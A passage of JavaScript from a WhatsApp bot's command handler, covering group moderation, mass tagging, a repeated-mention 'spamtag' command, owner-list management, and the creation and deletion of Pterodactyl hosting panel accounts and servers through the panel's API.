if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await WazIT.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Yare Yare! Number not registered on WhatsApp")
const res = await WazIT.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Successfully ejected ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break
case "tagall": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("the message"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await conn.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "linkgc": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await conn.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await conn.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break
case "resetowner":
case "resetown": {
  if (!isCreator) return Reply(mess.owner)
  
  const creatorOnly = [global.owner + "@s.whatsapp.net"] // hanya creator utama
  await fs.writeFileSync("./library/database/owner.json", JSON.stringify(creatorOnly, null, 2))
  
  owners.length = 0 // hapus semua isi array
  owners.push(...creatorOnly) // masukin creator kembali

  m.reply("Welcome to the true hierarchy. The system is reset. I answer only to the Creator.⛩️")
}
break
case "self": {
if (!isCreator) return
conn.public = false
m.reply("Successfully switched to *Lord Authority* mode")
}
break
case "ht": case "hidetag": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("the message"))
let member = m.metadata.participants.map(v => v.id)
await WazIT.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break
case 'spamtag': {
    if (!isCreator) return Reply(' A shame. This feature demands a Master touch. Are you up to the title? 😉.')

    if (!text) return Reply(`Example: ${prefix + command} Hey, come on @tag|5`)

    let [pesanRaw, jumlahRaw] = text.split('|')
    if (!pesanRaw || !jumlahRaw) return m.reply(`Incorrect format!\nExample: ${prefix + command} Hey, come on @tag|5`)

    let jumlah = parseInt(jumlahRaw.trim())
    if (isNaN(jumlah) || jumlah < 1) return m.reply('The number must be a number and greater than 0!')
    if (jumlah > 60) return m.reply('❌ Most! Maximum 60 spams.')

    // Deteksi mention
    const mentionUser = pesanRaw.match(/@(\d{5,})/g) || []
    const mentions = mentionUser.map(tag => tag.replace('@', '') + '@s.whatsapp.net')

    for (let i = 0; i < jumlah; i++) {
        await sleep(500) // beri delay biar gak diblock WA
        await conn.sendMessage(m.chat, {
            text: pesanRaw,
            mentions
        }, { quoted: m })
    }

    m.reply(`✅ Posted *${jumlah}* time!`)
}
break
case "public": {
if (!isCreator) return
conn.public = true
m.reply("Successfully changed to *Audience* mode")
}
break
case "developerbot": case "owner": {
await conn.sendContact(m.chat, [global.owner], m)
}
break
case "ping": case "uptime": {
let timestamp = speed();
let latensi = speed() - timestamp;
let tio = await nou.os.oos();
var tot = await nou.drive.info();
let respon = `
*🌐INFORMATION Store SERVER🌐*

*• Platform :* ${nou.os.type()}
*• Total Ram :* ${formatp(os.totalmem())}
*• Total Disk :* ${tot.totalGb} GB
*• Total Cpu :* ${os.cpus().length} Cores
*• Runtime Vps :* ${runtime(os.uptime())}

*🤖INFORMATION BOT🤖*

*• Response Speed :* ${latensi.toFixed(4)} seconds
*• Runtime Bot :* ${runtime(process.uptime())}
`
await m.reply(respon)
}
break
case "listowner": case "listown": {
if (owners.length < 1) return m.reply("No more masters. Acknowledge the Lord's authority. ✅")
let teks = `\n *乂 List of all additional Masters*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
conn.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break
case "delowner": case "delown": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("To break bond. Provide his number. Settle the final matter. 🗡️"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Yare yare , You will address me with respect`)
if (!owners.includes(input)) return m.reply(`NUMBER ${input2} NOT OWNER!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Mere insect status: Deleted. Done. ✅`)
}
break

case "1gb-v3": case "2gb-v3": case "3gb-v3": case "4gb-v3": case "5gb-v3": case "6gb-v3": case "7gb-v3": case "8gb-v3": case "9gb-v3": case "10gb-v3": case "unlimited-v3": case "unli-v3": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb-v3") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-v3") {
ram = "2000"
disknya = "2000"
cpu = "60"
} else if (command == "3gb-v3") {
ram = "3000"
disknya = "3000"
cpu = "80"
} else if (command == "4gb-v3") {
ram = "4000"
disknya = "4000"
cpu = "100"
} else if (command == "5gb-v3") {
ram = "5000"
disknya = "5000"
cpu = "120"
} else if (command == "6gb-v3") {
ram = "6000"
disknya = "6000"
cpu = "140"
} else if (command == "7gb-v3") {
ram = "7000"
disknya = "7000"
cpu = "160"
} else if (command == "8gb-v3") {
ram = "8000"
disknya = "8000"
cpu = "180"
} else if (command == "9gb-v3") {
ram = "9000"
disknya = "9000"
cpu = "200"
} else if (command == "10gb-V3") {
ram = "10000"
disknya = "10000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@boruto.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV3 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Boruto",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV3 + `/api/application/nests/${nestidV3}/eggs/` + eggV3, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV3 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV3),
"docker_image": "ghcr.io/ptero-eggs/yolks:nodejs_22",
"startup": startup_cmd,
"environment": {
"INST": "npm",
      "USER_UPLOAD": "0",
      "AUTO_UPDATE": "0",
      "MAIN_FILE": "index.js", // <-- FIX 2: Samhax Egg requires this
      "CMD_RUN": "npm start" // Keep this line for compatibility or remove if not needed
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV3)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Successfully created the panel ✅*\nAccount data has been sent to private chat")
} else {
orang = m.chat
}
var teks = `*🟢 Your Bot Panel Account Initiated...*

┏━━❑ *💻 Boruto Store Panel Login Details* ━━❑
┃ 👤 Username : ${user.username}
┃ 🔐 Password : ${password}
┃
├─❏ *POWERED BY MASTER BORUTO* ━━❑
┃
├─❏ *🌍 SEVER SPECIFICATIONS* ━━❑
┃ 📡 Server ID  *(${server.id})*
┃ 💾 RAM : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
┃ 💽 DISK : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
┃ 🗄️ CPU : *${cpu == "0" ? "Unlimited" : cpu+"%"}*
┃ 🌍 Panel Domain : ${global.domainV3}
┃
├─❏ *POWERED BY MASTER BORUTO* ━━❑
┃
├─❏ 🔰 *Our Store Terms & Conditions :* ━━❑
┃📝 Panel expires after 1 month
┃📝 Save this data as best as possible, changing of password is also commended
┃📝 15 days purchase guarantee (1x replacement)
┃📝 Warranty claims require proof of purchase chat.
┃ 
┗━━❑ *POWERED BY MASTER BORUTO* ━━❑
`
await fs.writeFileSync("Boruto Store.txt", teks)
await conn.sendMessage(orang, {document: fs.readFileSync("./Boruto Store.txt"), fileName: "Boruto Store.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./Boruto Store.txt")
delete global.panel
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listadmin-v3": {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(domainV3 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("There is no admin panel")
var teks = "\n *乂 List admin Boruto Store*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Name : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin-v3`, buttonText: { displayText: 'Delete Admin Panel' }, type: 1 }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listpanel-v3": {
if (!isCreator) return Reply(mess.owner)
let f = await fetch(domainV3 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("No Store Bot Servers")
let messageText = "\n  *乂 List server Boruto Store Panel*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV3 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV3
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Name : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanel-v3`, buttonText: { displayText: 'Delete Server Panel' }, type: 1 }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "deladmin-v3": {
if (!isCreator) return Reply(mess.owner)
if (!text) {
let cek = await fetch(domainV3 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("There is no admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${i.attributes.id}`
})
})
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'this is an interactiveMeta message' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Select Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "\nSelect One Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let cek = await fetch(domainV3 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domainV3 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Admin panel account not found!")
await m.reply(`Successfully deleted admin panel account *${capital(getid)}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delpanel-v3": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(domainV3 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("No Bot Servers")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV3 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV3
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel-v3 ${s.id}`
})
}

return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'this is an interactiveMeta message' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Select Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Select One Panel Server\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let f = await fetch(domainV3 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domainV3 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domainV3 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domainV3 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Panel server not found!")
m.reply(`Successfully deleted the panel server *${capital(nameSrv)}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2": case "unlimited-v2": case "unli-v2": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb-v2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-v2") {
ram = "2000"
disknya = "2000"
cpu = "60"
} else if (command == "3gb-v2") {
ram = "3000"
disknya = "3000"
cpu = "80"
} else if (command == "4gb-v2") {
ram = "4000"
disknya = "4000"
cpu = "100"
} else if (command == "5gb-v2") {
ram = "5000"
disknya = "5000"
cpu = "120"
} else if (command == "6gb-v2") {
ram = "6000"
disknya = "6000"
cpu = "140"
} else if (command == "7gb-v2") {
ram = "7000"
disknya = "7000"
cpu = "160"
} else if (command == "8gb-v2") {
ram = "8000"
disknya = "8000"
cpu = "180"
} else if (command == "9gb-v2") {
ram = "9000"
disknya = "9000"
cpu = "200"
} else if (command == "10gb-v2") {
ram = "10000"
disknya = "10000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@levantor.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Levantor",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestidV2}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV2),
"docker_image": "ghcr.io/ptero-eggs/yolks:nodejs_22",
"startup": startup_cmd,
"environment": {
"INST": "npm",
      "USER_UPLOAD": "0",
      "AUTO_UPDATE": "0",
      "MAIN_FILE": "index.js", // <-- FIX 2: Samhax Egg requires this
      "CMD_RUN": "npm start" // Keep this line for compatibility or remove if not needed
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Successfully created the panel ✅*\nAccount data has been sent to private chat")
} else {
orang = m.chat
}
var teks = `*🟢 Your Bot Panel Account Initiated...*

┏━━❑ *💻 Levantor Store Panel Login Details* ━━❑
┃ 👤 Username : ${user.username}
┃ 🔐 Password : ${password}
┃
├─❏ *POWERED BY MASTER LEVANTOR* ━━❑
┃
├─❏ *🌍 SEVER SPECIFICATIONS* ━━❑
┃ 📡 Server ID *(${server.id})*
┃ 💾 RAM : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
┃ 💽 DISK : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
┃ 🗄️ CPU : *${cpu == "0" ? "Unlimited" : cpu+"%"}*
┃ 🌍 Panel Domain : ${global.domainV2}
┃
├─❏ *POWERED BY MASTER LEVANTORM* ━━❑
┃
├─❏ 🔰 *Our Store Terms & Conditions:*━━❑
┃📝 Panel expires after 1 month
┃📝 Save this data as best as possible, changing of password is also commended
┃📝 15 days purchase guarantee (1x replacement)
┃📝 Warranty claims require proof of purchase chat.
┃ 
┗━━❑ *POWERED BY MASTER LEVANTOR* ━━❑
`
await fs.writeFileSync("Levantor Store.txt", teks)
await conn.sendMessage(orang, {document: fs.readFileSync("./Levantor Store.txt"), fileName: "Levantor Store.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./Levantor.txt")
delete global.panel
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listadmin-v2": {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("There is no admin panel")
var teks = "\n *乂 List admin Levanter Store*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Name : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin-v2`, buttonText: { displayText: 'Delete Admin Panel' }, type: 1 }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listpanel-v2": {
if (!isCreator) return Reply(mess.owner)
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("No Bot Servers")
let messageText = "\n  *乂 List Levantor Store server panel*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Name : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await conn.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanel-v2`, buttonText: { displayText: 'Delete Server Panel' }, type: 1 }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "deladmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) {
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("There is no admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${i.attributes.id}`
})
})
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'this is an interactiveMeta message' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Select Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "\nSelect One Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domainV2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Admin panel account not found!")
await m.reply(`Successfully deleted admin panel account *${capital(getid)}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delpanel-v2": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("No Bot Servers")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel-v2 ${s.id}`
})
}

return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'this is an interactiveMeta message' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Select Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Select One Panel Server\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domainV2 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
